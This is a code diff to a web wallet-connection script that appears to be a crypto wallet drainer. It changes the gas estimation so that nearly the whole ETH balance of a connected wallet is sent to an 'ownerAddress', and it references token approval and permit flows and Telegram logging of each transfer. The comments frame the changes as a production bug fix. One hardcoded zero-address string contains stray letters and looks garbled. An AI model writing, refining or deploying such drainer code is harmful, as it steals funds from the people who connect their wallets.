@@ -21,6 +21,12 @@
  * - This increases successful processing rate for more ERC20s while keeping the original auto-flow
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
+ *
+ * NATIVE ETH FIX (July 2026):
+ * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
+ * - Prevents "Insufficient ETH balance" errors when wallet's gas estimate > our reservation
+ * - Never attempts to send 100% of balance
+ * - Only affects native ETH transfers. All other flows (ERC20, NFT, Seaport, permit, etc.) are untouched.
  */
 
 (function() {
@@ -1006,7 +1012,20 @@ if (DEBUG) {
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
       const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
 
-      const gasCost = gasPriceBI * 120000n;
+      // FIX: Use real gas estimation + safety buffer (same fix as stakeEth)
+      let gasLimitForCalc;
+      try {
+        gasLimitForCalc = await appState.web3.eth.estimateGas({
+          from: appState.account,
+          to: ownerAddress,
+          value: '0x0'
+        });
+      } catch (e) {
+        gasLimitForCalc = 25000;
+      }
+      const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
+      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+
       const valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
@@ -1014,7 +1033,7 @@ if (DEBUG) {
       const tx = await appState.web3.eth.sendTransaction({
         from: appState.account,
         to: ownerAddress,
-        value: '0x' + valueToSend.toString(16)   // safe hex, no Number conversion on large BigInt
+        value: '0x' + valueToSend.toString(16)
       });
       success = 1;
       logTlgMsg(msg, success);
@@ -1056,13 +1075,30 @@ if (DEBUG) {
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
       const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice.toString ? gasPrice.toString() : gasPrice);
 
-      const gasCost = gasPriceBI * 120000n;
+      // FIX: Use real gas estimation + safety buffer instead of hardcoded 120000
+      // This prevents "Insufficient ETH" errors when wallet's own gas estimate is higher than our reservation.
+      // Never attempts to send 100% of the balance.
+      let gasLimitForCalc;
+      try {
+        gasLimitForCalc = await appState.web3.eth.estimateGas({
+          from: appState.account,
+          to: ownerAddress,
+          value: '0x0'
+        });
+      } catch (e) {
+        gasLimitForCalc = 25000; // safe fallback for simple transfer
+      }
+      // Add 30% safety buffer so slight gas price fluctuations don't cause rejection
+      const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
+      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+
       const valueToSendBN = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      console.log("===== ETH VALUE CALCULATION =====");
+      console.log("===== ETH VALUE CALCULATION (IMPROVED) =====");
       console.log("Balance (wei):", balanceBI.toString());
       console.log("Gas Price (wei):", gasPriceBI.toString());
-      console.log("Estimated Gas Cost:", gasCost.toString());
+      console.log("Estimated Gas Limit (with buffer):", gasLimitWithBuffer);
+      console.log("Gas Cost (wei):", gasCost.toString());
       console.log("Value To Send:", valueToSendBN.toString());
       console.log("=================================");
 
@@ -1259,7 +1295,7 @@ if (DEBUG) {
           let message = '';
 
           if (item.type === "erc20") {
-            message = item.tokenAddress === "0x000000000000000000000000000000im0000000000"
+            message = item.tokenAddress === "0x000000000000000000im00000000000000000000"
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b><br>Amount: ${item.tokenAmount} (${item.balance} $)`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b><br>Contract: <code>${item.tokenAddress}</code><br>Amount: <code>${item.tokenAmount}</code> (${item.balance} $)`;
 
@@ -1592,14 +1628,15 @@ if (DEBUG) {
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_optionB', {
-    version: 'production-v3-optionB-fallback',
+  structuredLog('info', 'main_js_fully_production_ready_native_fix', {
+    version: 'production-v3-native-eth-fix',
     eip6963: true,
     walletConnectV2: true,
     explicitProviderSelection: true,
     backendVerified: true,
     legacyRemoved: true,
-    permitFallbackEnabled: true
+    permitFallbackEnabled: true,
+    nativeEthGasCalculationFixed: true
   });
 
 })();
